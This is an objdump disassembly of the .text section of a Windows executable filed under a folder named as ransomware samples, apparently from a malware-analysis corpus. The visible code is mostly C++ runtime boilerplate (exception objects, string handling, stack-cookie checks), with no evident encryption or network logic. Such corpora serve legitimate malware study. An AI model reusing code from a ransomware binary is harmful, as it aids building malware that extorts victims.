
malware_samples/ransomware/94b5d0e40f6d108e0acc376f2b227167386259e0e197d205a1579350cc302b03.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	68 2b 81 40 00       	push   $0x40812b
  401005:	e8 70 5f 00 00       	call   0x406f7a
  40100a:	59                   	pop    %ecx
  40100b:	c3                   	ret
  40100c:	cc                   	int3
  40100d:	cc                   	int3
  40100e:	cc                   	int3
  40100f:	cc                   	int3
  401010:	55                   	push   %ebp
  401011:	8b ec                	mov    %esp,%ebp
  401013:	56                   	push   %esi
  401014:	8b f1                	mov    %ecx,%esi
  401016:	0f 57 c0             	xorps  %xmm0,%xmm0
  401019:	8d 46 04             	lea    0x4(%esi),%eax
  40101c:	50                   	push   %eax
  40101d:	c7 06 64 93 40 00    	movl   $0x409364,(%esi)
  401023:	66 0f d6 00          	movq   %xmm0,(%eax)
  401027:	8b 45 08             	mov    0x8(%ebp),%eax
  40102a:	83 c0 04             	add    $0x4,%eax
  40102d:	50                   	push   %eax
  40102e:	ff 15 24 91 40 00    	call   *0x409124
  401034:	83 c4 08             	add    $0x8,%esp
  401037:	8b c6                	mov    %esi,%eax
  401039:	5e                   	pop    %esi
  40103a:	5d                   	pop    %ebp
  40103b:	c2 04 00             	ret    $0x4
  40103e:	cc                   	int3
  40103f:	cc                   	int3
  401040:	8b 49 04             	mov    0x4(%ecx),%ecx
  401043:	b8 94 93 40 00       	mov    $0x409394,%eax
  401048:	85 c9                	test   %ecx,%ecx
  40104a:	0f 45 c1             	cmovne %ecx,%eax
  40104d:	c3                   	ret
  40104e:	cc                   	int3
  40104f:	cc                   	int3
  401050:	55                   	push   %ebp
  401051:	8b ec                	mov    %esp,%ebp
  401053:	56                   	push   %esi
  401054:	8b f1                	mov    %ecx,%esi
  401056:	8d 46 04             	lea    0x4(%esi),%eax
  401059:	c7 06 64 93 40 00    	movl   $0x409364,(%esi)
  40105f:	50                   	push   %eax
  401060:	ff 15 20 91 40 00    	call   *0x409120
  401066:	83 c4 04             	add    $0x4,%esp
  401069:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40106d:	74 0b                	je     0x40107a
  40106f:	6a 0c                	push   $0xc
  401071:	56                   	push   %esi
  401072:	e8 45 5a 00 00       	call   0x406abc
  401077:	83 c4 08             	add    $0x8,%esp
  40107a:	8b c6                	mov    %esi,%eax
  40107c:	5e                   	pop    %esi
  40107d:	5d                   	pop    %ebp
  40107e:	c2 04 00             	ret    $0x4
  401081:	cc                   	int3
  401082:	cc                   	int3
  401083:	cc                   	int3
  401084:	cc                   	int3
  401085:	cc                   	int3
  401086:	cc                   	int3
  401087:	cc                   	int3
  401088:	cc                   	int3
  401089:	cc                   	int3
  40108a:	cc                   	int3
  40108b:	cc                   	int3
  40108c:	cc                   	int3
  40108d:	cc                   	int3
  40108e:	cc                   	int3
  40108f:	cc                   	int3
  401090:	8d 41 04             	lea    0x4(%ecx),%eax
  401093:	c7 01 64 93 40 00    	movl   $0x409364,(%ecx)
  401099:	50                   	push   %eax
  40109a:	ff 15 20 91 40 00    	call   *0x409120
  4010a0:	59                   	pop    %ecx
  4010a1:	c3                   	ret
  4010a2:	cc                   	int3
  4010a3:	cc                   	int3
  4010a4:	cc                   	int3
  4010a5:	cc                   	int3
  4010a6:	cc                   	int3
  4010a7:	cc                   	int3
  4010a8:	cc                   	int3
  4010a9:	cc                   	int3
  4010aa:	cc                   	int3
  4010ab:	cc                   	int3
  4010ac:	cc                   	int3
  4010ad:	cc                   	int3
  4010ae:	cc                   	int3
  4010af:	cc                   	int3
  4010b0:	0f 57 c0             	xorps  %xmm0,%xmm0
  4010b3:	8b c1                	mov    %ecx,%eax
  4010b5:	66 0f d6 41 04       	movq   %xmm0,0x4(%ecx)
  4010ba:	c7 41 04 a8 93 40 00 	movl   $0x4093a8,0x4(%ecx)
  4010c1:	c7 01 8c 93 40 00    	movl   $0x40938c,(%ecx)
  4010c7:	c3                   	ret
  4010c8:	cc                   	int3
  4010c9:	cc                   	int3
  4010ca:	cc                   	int3
  4010cb:	cc                   	int3
  4010cc:	cc                   	int3
  4010cd:	cc                   	int3
  4010ce:	cc                   	int3
  4010cf:	cc                   	int3
  4010d0:	55                   	push   %ebp
  4010d1:	8b ec                	mov    %esp,%ebp
  4010d3:	83 ec 0c             	sub    $0xc,%esp
  4010d6:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4010d9:	e8 d2 ff ff ff       	call   0x4010b0
  4010de:	68 a8 aa 40 00       	push   $0x40aaa8
  4010e3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010e6:	50                   	push   %eax
  4010e7:	e8 a4 65 00 00       	call   0x407690
  4010ec:	cc                   	int3
  4010ed:	cc                   	int3
  4010ee:	cc                   	int3
  4010ef:	cc                   	int3
  4010f0:	55                   	push   %ebp
  4010f1:	8b ec                	mov    %esp,%ebp
  4010f3:	56                   	push   %esi
  4010f4:	8b f1                	mov    %ecx,%esi
  4010f6:	0f 57 c0             	xorps  %xmm0,%xmm0
  4010f9:	8d 46 04             	lea    0x4(%esi),%eax
  4010fc:	50                   	push   %eax
  4010fd:	c7 06 64 93 40 00    	movl   $0x409364,(%esi)
  401103:	66 0f d6 00          	movq   %xmm0,(%eax)
  401107:	8b 45 08             	mov    0x8(%ebp),%eax
  40110a:	83 c0 04             	add    $0x4,%eax
  40110d:	50                   	push   %eax
  40110e:	ff 15 24 91 40 00    	call   *0x409124
  401114:	83 c4 08             	add    $0x8,%esp
  401117:	c7 06 8c 93 40 00    	movl   $0x40938c,(%esi)
  40111d:	8b c6                	mov    %esi,%eax
  40111f:	5e                   	pop    %esi
  401120:	5d                   	pop    %ebp
  401121:	c2 04 00             	ret    $0x4
  401124:	cc                   	int3
  401125:	cc                   	int3
  401126:	cc                   	int3
  401127:	cc                   	int3
  401128:	cc                   	int3
  401129:	cc                   	int3
  40112a:	cc                   	int3
  40112b:	cc                   	int3
  40112c:	cc                   	int3
  40112d:	cc                   	int3
  40112e:	cc                   	int3
  40112f:	cc                   	int3
  401130:	55                   	push   %ebp
  401131:	8b ec                	mov    %esp,%ebp
  401133:	56                   	push   %esi
  401134:	8b f1                	mov    %ecx,%esi
  401136:	0f 57 c0             	xorps  %xmm0,%xmm0
  401139:	8d 46 04             	lea    0x4(%esi),%eax
  40113c:	50                   	push   %eax
  40113d:	c7 06 64 93 40 00    	movl   $0x409364,(%esi)
  401143:	66 0f d6 00          	movq   %xmm0,(%eax)
  401147:	8b 45 08             	mov    0x8(%ebp),%eax
  40114a:	83 c0 04             	add    $0x4,%eax
  40114d:	50                   	push   %eax
  40114e:	ff 15 24 91 40 00    	call   *0x409124
  401154:	83 c4 08             	add    $0x8,%esp
  401157:	c7 06 70 93 40 00    	movl   $0x409370,(%esi)
  40115d:	8b c6                	mov    %esi,%eax
  40115f:	5e                   	pop    %esi
  401160:	5d                   	pop    %ebp
  401161:	c2 04 00             	ret    $0x4
  401164:	cc                   	int3
  401165:	cc                   	int3
  401166:	cc                   	int3
  401167:	cc                   	int3
  401168:	cc                   	int3
  401169:	cc                   	int3
  40116a:	cc                   	int3
  40116b:	cc                   	int3
  40116c:	cc                   	int3
  40116d:	cc                   	int3
  40116e:	cc                   	int3
  40116f:	cc                   	int3
  401170:	68 c0 93 40 00       	push   $0x4093c0
  401175:	ff 15 e8 90 40 00    	call   *0x4090e8
  40117b:	cc                   	int3
  40117c:	cc                   	int3
  40117d:	cc                   	int3
  40117e:	cc                   	int3
  40117f:	cc                   	int3
  401180:	55                   	push   %ebp
  401181:	8b ec                	mov    %esp,%ebp
  401183:	56                   	push   %esi
  401184:	8b f1                	mov    %ecx,%esi
  401186:	0f 57 c0             	xorps  %xmm0,%xmm0
  401189:	8d 46 04             	lea    0x4(%esi),%eax
  40118c:	50                   	push   %eax
  40118d:	c7 06 64 93 40 00    	movl   $0x409364,(%esi)
  401193:	66 0f d6 00          	movq   %xmm0,(%eax)
  401197:	8b 45 08             	mov    0x8(%ebp),%eax
  40119a:	83 c0 04             	add    $0x4,%eax
  40119d:	50                   	push   %eax
  40119e:	ff 15 24 91 40 00    	call   *0x409124
  4011a4:	83 c4 08             	add    $0x8,%esp
  4011a7:	c7 06 a0 95 40 00    	movl   $0x4095a0,(%esi)
  4011ad:	8b c6                	mov    %esi,%eax
  4011af:	5e                   	pop    %esi
  4011b0:	5d                   	pop    %ebp
  4011b1:	c2 04 00             	ret    $0x4
  4011b4:	cc                   	int3
  4011b5:	cc                   	int3
  4011b6:	cc                   	int3
  4011b7:	cc                   	int3
  4011b8:	cc                   	int3
  4011b9:	cc                   	int3
  4011ba:	cc                   	int3
  4011bb:	cc                   	int3
  4011bc:	cc                   	int3
  4011bd:	cc                   	int3
  4011be:	cc                   	int3
  4011bf:	cc                   	int3
  4011c0:	55                   	push   %ebp
  4011c1:	8b ec                	mov    %esp,%ebp
  4011c3:	8b 45 08             	mov    0x8(%ebp),%eax
  4011c6:	8b 55 0c             	mov    0xc(%ebp),%edx
  4011c9:	89 10                	mov    %edx,(%eax)
  4011cb:	89 48 04             	mov    %ecx,0x4(%eax)
  4011ce:	5d                   	pop    %ebp
  4011cf:	c2 08 00             	ret    $0x8
  4011d2:	cc                   	int3
  4011d3:	cc                   	int3
  4011d4:	cc                   	int3
  4011d5:	cc                   	int3
  4011d6:	cc                   	int3
  4011d7:	cc                   	int3
  4011d8:	cc                   	int3
  4011d9:	cc                   	int3
  4011da:	cc                   	int3
  4011db:	cc                   	int3
  4011dc:	cc                   	int3
  4011dd:	cc                   	int3
  4011de:	cc                   	int3
  4011df:	cc                   	int3
  4011e0:	55                   	push   %ebp
  4011e1:	8b ec                	mov    %esp,%ebp
  4011e3:	8b 01                	mov    (%ecx),%eax
  4011e5:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4011e8:	83 ec 08             	sub    $0x8,%esp
  4011eb:	56                   	push   %esi
  4011ec:	ff 75 08             	push   0x8(%ebp)
  4011ef:	52                   	push   %edx
  4011f0:	ff 50 0c             	call   *0xc(%eax)
  4011f3:	8b 75 0c             	mov    0xc(%ebp),%esi
  4011f6:	8b 48 04             	mov    0x4(%eax),%ecx
  4011f9:	8b 56 04             	mov    0x4(%esi),%edx
  4011fc:	8b 49 04             	mov    0x4(%ecx),%ecx
  4011ff:	3b 4a 04             	cmp    0x4(%edx),%ecx
  401202:	75 0f                	jne    0x401213
  401204:	8b 00                	mov    (%eax),%eax
  401206:	3b 06                	cmp    (%esi),%eax
  401208:	75 09                	jne    0x401213
  40120a:	b0 01                	mov    $0x1,%al
  40120c:	5e                   	pop    %esi
  40120d:	8b e5                	mov    %ebp,%esp
  40120f:	5d                   	pop    %ebp
  401210:	c2 08 00             	ret    $0x8
  401213:	32 c0                	xor    %al,%al
  401215:	5e                   	pop    %esi
  401216:	8b e5                	mov    %ebp,%esp
  401218:	5d                   	pop    %ebp
  401219:	c2 08 00             	ret    $0x8
  40121c:	cc                   	int3
  40121d:	cc                   	int3
  40121e:	cc                   	int3
  40121f:	cc                   	int3
  401220:	55                   	push   %ebp
  401221:	8b ec                	mov    %esp,%ebp
  401223:	8b 41 04             	mov    0x4(%ecx),%eax
  401226:	56                   	push   %esi
  401227:	8b 75 08             	mov    0x8(%ebp),%esi
  40122a:	8b 56 04             	mov    0x4(%esi),%edx
  40122d:	3b 42 04             	cmp    0x4(%edx),%eax
  401230:	75 0e                	jne    0x401240
  401232:	8b 06                	mov    (%esi),%eax
  401234:	3b 45 0c             	cmp    0xc(%ebp),%eax
  401237:	75 07                	jne    0x401240
  401239:	b0 01                	mov    $0x1,%al
  40123b:	5e                   	pop    %esi
  40123c:	5d                   	pop    %ebp
  40123d:	c2 08 00             	ret    $0x8
  401240:	32 c0                	xor    %al,%al
  401242:	5e                   	pop    %esi
  401243:	5d                   	pop    %ebp
  401244:	c2 08 00             	ret    $0x8
  401247:	cc                   	int3
  401248:	cc                   	int3
  401249:	cc                   	int3
  40124a:	cc                   	int3
  40124b:	cc                   	int3
  40124c:	cc                   	int3
  40124d:	cc                   	int3
  40124e:	cc                   	int3
  40124f:	cc                   	int3
  401250:	c7 01 16 00 00 00    	movl   $0x16,(%ecx)
  401256:	8b c1                	mov    %ecx,%eax
  401258:	c7 41 04 18 c0 40 00 	movl   $0x40c018,0x4(%ecx)
  40125f:	c3                   	ret
  401260:	53                   	push   %ebx
  401261:	8b dc                	mov    %esp,%ebx
  401263:	83 ec 08             	sub    $0x8,%esp
  401266:	83 e4 f8             	and    $0xfffffff8,%esp
  401269:	83 c4 04             	add    $0x4,%esp
  40126c:	55                   	push   %ebp
  40126d:	8b 6b 04             	mov    0x4(%ebx),%ebp
  401270:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  401274:	8b ec                	mov    %esp,%ebp
  401276:	6a ff                	push   $0xffffffff
  401278:	68 e5 79 40 00       	push   $0x4079e5
  40127d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401283:	50                   	push   %eax
  401284:	53                   	push   %ebx
  401285:	83 ec 58             	sub    $0x58,%esp
  401288:	a1 04 c0 40 00       	mov    0x40c004,%eax
  40128d:	33 c5                	xor    %ebp,%eax
  40128f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401292:	56                   	push   %esi
  401293:	57                   	push   %edi
  401294:	50                   	push   %eax
  401295:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401298:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40129e:	8b f9                	mov    %ecx,%edi
  4012a0:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4012a3:	8b 43 08             	mov    0x8(%ebx),%eax
  4012a6:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4012a9:	50                   	push   %eax
  4012aa:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4012ad:	e8 4e 31 00 00       	call   0x404400
  4012b2:	8b 43 0c             	mov    0xc(%ebx),%eax
  4012b5:	8b 73 10             	mov    0x10(%ebx),%esi
  4012b8:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4012bb:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4012c2:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4012c5:	85 c9                	test   %ecx,%ecx
  4012c7:	74 40                	je     0x401309
  4012c9:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4012cc:	8b c2                	mov    %edx,%eax
  4012ce:	2b c1                	sub    %ecx,%eax
  4012d0:	83 f8 02             	cmp    $0x2,%eax
  4012d3:	72 20                	jb     0x4012f5
  4012d5:	8d 41 02             	lea    0x2(%ecx),%eax
  4012d8:	83 fa 10             	cmp    $0x10,%edx
  4012db:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4012de:	ba 3a 20 00 00       	mov    $0x203a,%edx
  4012e3:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4012e6:	0f 43 45 c8          	cmovae -0x38(%ebp),%eax
  4012ea:	66 89 14 08          	mov    %dx,(%eax,%ecx,1)
  4012ee:	c6 44 08 02 00       	movb   $0x0,0x2(%eax,%ecx,1)
  4012f3:	eb 14                	jmp    0x401309
  4012f5:	6a 02                	push   $0x2
  4012f7:	68 d0 93 40 00       	push   $0x4093d0
  4012fc:	ff 75 e0             	push   -0x20(%ebp)
  4012ff:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401302:	6a 02                	push   $0x2
  401304:	e8 47 47 00 00       	call   0x405a50
  401309:	ff 75 e0             	push   -0x20(%ebp)
  40130c:	8b 06                	mov    (%esi),%eax
  40130e:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  401311:	51                   	push   %ecx
  401312:	8b ce                	mov    %esi,%ecx
  401314:	ff 50 08             	call   *0x8(%eax)
  401317:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  40131b:	8d 55 b0             	lea    -0x50(%ebp),%edx
  40131e:	83 7d c4 10          	cmpl   $0x10,-0x3c(%ebp)
  401322:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  401325:	0f 43 55 b0          	cmovae -0x50(%ebp),%edx
  401329:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40132c:	8b 75 d8             	mov    -0x28(%ebp),%esi
  40132f:	2b c6                	sub    %esi,%eax
  401331:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401334:	51                   	push   %ecx
  401335:	52                   	push   %edx
  401336:	3b c8                	cmp    %eax,%ecx
  401338:	77 25                	ja     0x40135f
  40133a:	83 7d dc 10          	cmpl   $0x10,-0x24(%ebp)
  40133e:	8d 04 31             	lea    (%ecx,%esi,1),%eax
  401341:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401344:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401347:	0f 43 45 c8          	cmovae -0x38(%ebp),%eax
  40134b:	03 f0                	add    %eax,%esi
  40134d:	56                   	push   %esi
  40134e:	e8 74 66 00 00       	call   0x4079c7
  401353:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401356:	83 c4 0c             	add    $0xc,%esp
  401359:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  40135d:	eb 0c                	jmp    0x40136b
  40135f:	ff 75 e0             	push   -0x20(%ebp)
  401362:	51                   	push   %ecx
  401363:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401366:	e8 e5 46 00 00       	call   0x405a50
  40136b:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40136e:	83 f9 10             	cmp    $0x10,%ecx
  401371:	72 2e                	jb     0x4013a1
  401373:	8b 55 b0             	mov    -0x50(%ebp),%edx
  401376:	41                   	inc    %ecx
  401377:	8b c2                	mov    %edx,%eax
  401379:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40137f:	72 16                	jb     0x401397
  401381:	8b 50 fc             	mov    -0x4(%eax),%edx
  401384:	83 c1 23             	add    $0x23,%ecx
  401387:	2b c2                	sub    %edx,%eax
  401389:	83 c0 fc             	add    $0xfffffffc,%eax
  40138c:	83 f8 1f             	cmp    $0x1f,%eax
  40138f:	76 06                	jbe    0x401397
  401391:	ff 15 80 91 40 00    	call   *0x409180
  401397:	51                   	push   %ecx
  401398:	52                   	push   %edx
  401399:	e8 1e 57 00 00       	call   0x406abc
  40139e:	83 c4 08             	add    $0x8,%esp
  4013a1:	0f 10 4d c8          	movups -0x38(%ebp),%xmm1
  4013a5:	f3 0f 7e 45 d8       	movq   -0x28(%ebp),%xmm0
  4013aa:	0f 11 4d 98          	movups %xmm1,-0x68(%ebp)
  4013ae:	66 0f d6 45 a8       	movq   %xmm0,-0x58(%ebp)
  4013b3:	83 7d ac 10          	cmpl   $0x10,-0x54(%ebp)
  4013b7:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  4013ba:	66 0f 7e c8          	movd   %xmm1,%eax
  4013be:	0f 57 c0             	xorps  %xmm0,%xmm0
  4013c1:	c7 07 64 93 40 00    	movl   $0x409364,(%edi)
  4013c7:	66 0f d6 47 04       	movq   %xmm0,0x4(%edi)
  4013cc:	0f 43 c8             	cmovae %eax,%ecx
  4013cf:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  4013d6:	8d 47 04             	lea    0x4(%edi),%eax
  4013d9:	c7 45 dc 0f 00 00 00 	movl   $0xf,-0x24(%ebp)
  4013e0:	50                   	push   %eax
  4013e1:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4013e4:	c6 45 c8 00          	movb   $0x0,-0x38(%ebp)
  4013e8:	50                   	push   %eax
  4013e9:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4013ec:	c6 45 e8 01          	movb   $0x1,-0x18(%ebp)
  4013f0:	ff 15 24 91 40 00    	call   *0x409124
  4013f6:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  4013f9:	83 c4 08             	add    $0x8,%esp
  4013fc:	c7 07 a0 95 40 00    	movl   $0x4095a0,(%edi)
  401402:	83 f9 10             	cmp    $0x10,%ecx
  401405:	72 2e                	jb     0x401435
  401407:	8b 55 98             	mov    -0x68(%ebp),%edx
  40140a:	41                   	inc    %ecx
  40140b:	8b c2                	mov    %edx,%eax
  40140d:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401413:	72 16                	jb     0x40142b
  401415:	8b 50 fc             	mov    -0x4(%eax),%edx
  401418:	83 c1 23             	add    $0x23,%ecx
  40141b:	2b c2                	sub    %edx,%eax
  40141d:	83 c0 fc             	add    $0xfffffffc,%eax
  401420:	83 f8 1f             	cmp    $0x1f,%eax
  401423:	76 06                	jbe    0x40142b
  401425:	ff 15 80 91 40 00    	call   *0x409180
  40142b:	51                   	push   %ecx
  40142c:	52                   	push   %edx
  40142d:	e8 8a 56 00 00       	call   0x406abc
  401432:	83 c4 08             	add    $0x8,%esp
  401435:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  401438:	8b c7                	mov    %edi,%eax
  40143a:	8b 53 10             	mov    0x10(%ebx),%edx
  40143d:	c7 07 ac 95 40 00    	movl   $0x4095ac,(%edi)
  401443:	89 4f 0c             	mov    %ecx,0xc(%edi)
  401446:	89 57 10             	mov    %edx,0x10(%edi)
  401449:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40144c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401453:	59                   	pop    %ecx
  401454:	5f                   	pop    %edi
  401455:	5e                   	pop    %esi
  401456:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401459:	33 cd                	xor    %ebp,%ecx
  40145b:	e8 19 56 00 00       	call   0x406a79
  401460:	8b e5                	mov    %ebp,%esp
  401462:	5d                   	pop    %ebp
  401463:	8b e3                	mov    %ebx,%esp
  401465:	5b                   	pop    %ebx
  401466:	c2 0c 00             	ret    $0xc
  401469:	cc                   	int3
  40146a:	cc                   	int3
  40146b:	cc                   	int3
  40146c:	cc                   	int3
  40146d:	cc                   	int3
  40146e:	cc                   	int3
  40146f:	cc                   	int3
  401470:	55                   	push   %ebp
  401471:	8b ec                	mov    %esp,%ebp
  401473:	56                   	push   %esi
  401474:	8b f1                	mov    %ecx,%esi
  401476:	8d 46 04             	lea    0x4(%esi),%eax
  401479:	c7 06 64 93 40 00    	movl   $0x409364,(%esi)
  40147f:	50                   	push   %eax
  401480:	ff 15 20 91 40 00    	call   *0x409120
  401486:	83 c4 04             	add    $0x4,%esp
  401489:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40148d:	74 0b                	je     0x40149a
  40148f:	6a 14                	push   $0x14
  401491:	56                   	push   %esi
  401492:	e8 25 56 00 00       	call   0x406abc
  401497:	83 c4 08             	add    $0x8,%esp
  40149a:	8b c6                	mov    %esi,%eax
  40149c:	5e                   	pop    %esi
  40149d:	5d                   	pop    %ebp
  40149e:	c2 04 00             	ret    $0x4
  4014a1:	cc                   	int3
  4014a2:	cc                   	int3
  4014a3:	cc                   	int3
  4014a4:	cc                   	int3
  4014a5:	cc                   	int3
  4014a6:	cc                   	int3
  4014a7:	cc                   	int3
  4014a8:	cc                   	int3
  4014a9:	cc                   	int3
  4014aa:	cc                   	int3
  4014ab:	cc                   	int3
  4014ac:	cc                   	int3
  4014ad:	cc                   	int3
  4014ae:	cc                   	int3
  4014af:	cc                   	int3
  4014b0:	55                   	push   %ebp
  4014b1:	8b ec                	mov    %esp,%ebp
  4014b3:	6a ff                	push   $0xffffffff
  4014b5:	68 1d 7a 40 00       	push   $0x407a1d
  4014ba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4014c0:	50                   	push   %eax
  4014c1:	83 ec 1c             	sub    $0x1c,%esp
  4014c4:	56                   	push   %esi
  4014c5:	a1 04 c0 40 00       	mov    0x40c004,%eax
  4014ca:	33 c5                	xor    %ebp,%eax
  4014cc:	50                   	push   %eax
  4014cd:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4014d0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4014d6:	8b f1                	mov    %ecx,%esi
  4014d8:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4014db:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4014de:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  4014e5:	6a 00                	push   $0x0
  4014e7:	68 d3 93 40 00       	push   $0x4093d3
  4014ec:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4014ef:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4014f6:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  4014fd:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  401501:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401508:	e8 f3 32 00 00       	call   0x404800
  40150d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401514:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401517:	ff 75 0c             	push   0xc(%ebp)
  40151a:	8b ce                	mov    %esi,%ecx
  40151c:	ff 75 08             	push   0x8(%ebp)
  40151f:	50                   	push   %eax
  401520:	e8 3b fd ff ff       	call   0x401260
  401525:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401528:	83 f9 10             	cmp    $0x10,%ecx
  40152b:	72 2e                	jb     0x40155b
  40152d:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401530:	41                   	inc    %ecx
  401531:	8b c2                	mov    %edx,%eax
  401533:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401539:	72 16                	jb     0x401551
  40153b:	8b 50 fc             	mov    -0x4(%eax),%edx
  40153e:	83 c1 23             	add    $0x23,%ecx
  401541:	2b c2                	sub    %edx,%eax
  401543:	83 c0 fc             	add    $0xfffffffc,%eax
  401546:	83 f8 1f             	cmp    $0x1f,%eax
  401549:	76 06                	jbe    0x401551
  40154b:	ff 15 80 91 40 00    	call   *0x409180
  401551:	51                   	push   %ecx
  401552:	52                   	push   %edx
  401553:	e8 64 55 00 00       	call   0x406abc
  401558:	83 c4 08             	add    $0x8,%esp
  40155b:	c7 06 f8 95 40 00    	movl   $0x4095f8,(%esi)
  401561:	8b c6                	mov    %esi,%eax
  401563:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401566:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40156d:	59                   	pop    %ecx
  40156e:	5e                   	pop    %esi
  40156f:	8b e5                	mov    %ebp,%esp
  401571:	5d                   	pop    %ebp
  401572:	c2 08 00             	ret    $0x8
  401575:	cc                   	int3
  401576:	cc                   	int3
  401577:	cc                   	int3
  401578:	cc                   	int3
  401579:	cc                   	int3
  40157a:	cc                   	int3
  40157b:	cc                   	int3
  40157c:	cc                   	int3
  40157d:	cc                   	int3
  40157e:	cc                   	int3
  40157f:	cc                   	int3
  401580:	55                   	push   %ebp
  401581:	8b ec                	mov    %esp,%ebp
  401583:	83 e4 f8             	and    $0xfffffff8,%esp
  401586:	51                   	push   %ecx
  401587:	56                   	push   %esi
  401588:	ff 75 0c             	push   0xc(%ebp)
  40158b:	8b f1                	mov    %ecx,%esi
  40158d:	ff 75 08             	push   0x8(%ebp)
  401590:	89 74 24 0c          	mov    %esi,0xc(%esp)
  401594:	ff 75 10             	push   0x10(%ebp)
  401597:	e8 c4 fc ff ff       	call   0x401260
  40159c:	c7 06 f8 95 40 00    	movl   $0x4095f8,(%esi)
  4015a2:	8b c6                	mov    %esi,%eax
  4015a4:	5e                   	pop    %esi
  4015a5:	8b e5                	mov    %ebp,%esp
  4015a7:	5d                   	pop    %ebp
  4015a8:	c2 0c 00             	ret    $0xc
  4015ab:	cc                   	int3
  4015ac:	cc                   	int3
  4015ad:	cc                   	int3
  4015ae:	cc                   	int3
  4015af:	cc                   	int3
  4015b0:	55                   	push   %ebp
  4015b1:	8b ec                	mov    %esp,%ebp
  4015b3:	83 e4 f8             	and    $0xfffffff8,%esp
  4015b6:	83 ec 20             	sub    $0x20,%esp
  4015b9:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4015bd:	e8 8e fc ff ff       	call   0x401250
  4015c2:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4015c6:	ff 70 04             	push   0x4(%eax)
  4015c9:	ff 30                	push   (%eax)
  4015cb:	e8 e0 fe ff ff       	call   0x4014b0
  4015d0:	68 88 a9 40 00       	push   $0x40a988
  4015d5:	8d 44 24 10          	lea    0x10(%esp),%eax
  4015d9:	50                   	push   %eax
  4015da:	e8 b1 60 00 00       	call   0x407690
  4015df:	cc                   	int3
  4015e0:	55                   	push   %ebp
  4015e1:	8b ec                	mov    %esp,%ebp
  4015e3:	56                   	push   %esi
  4015e4:	8b 75 08             	mov    0x8(%ebp),%esi
  4015e7:	0f 57 c0             	xorps  %xmm0,%xmm0
  4015ea:	57                   	push   %edi
  4015eb:	8b f9                	mov    %ecx,%edi
  4015ed:	8d 47 04             	lea    0x4(%edi),%eax
  4015f0:	50                   	push   %eax
  4015f1:	c7 07 64 93 40 00    	movl   $0x409364,(%edi)
  4015f7:	66 0f d6 00          	movq   %xmm0,(%eax)
  4015fb:	8d 46 04             	lea    0x4(%esi),%eax
  4015fe:	50                   	push   %eax
  4015ff:	ff 15 24 91 40 00    	call   *0x409124
  401605:	c7 07 ac 95 40 00    	movl   $0x4095ac,(%edi)
  40160b:	83 c4 08             	add    $0x8,%esp
  40160e:	8b 46 0c             	mov    0xc(%esi),%eax
  401611:	8b 4e 10             	mov    0x10(%esi),%ecx
  401614:	89 47 0c             	mov    %eax,0xc(%edi)
  401617:	8b c7                	mov    %edi,%eax
  401619:	89 4f 10             	mov    %ecx,0x10(%edi)
  40161c:	c7 07 f8 95 40 00    	movl   $0x4095f8,(%edi)
  401622:	5f                   	pop    %edi
  401623:	5e                   	pop    %esi
  401624:	5d                   	pop    %ebp
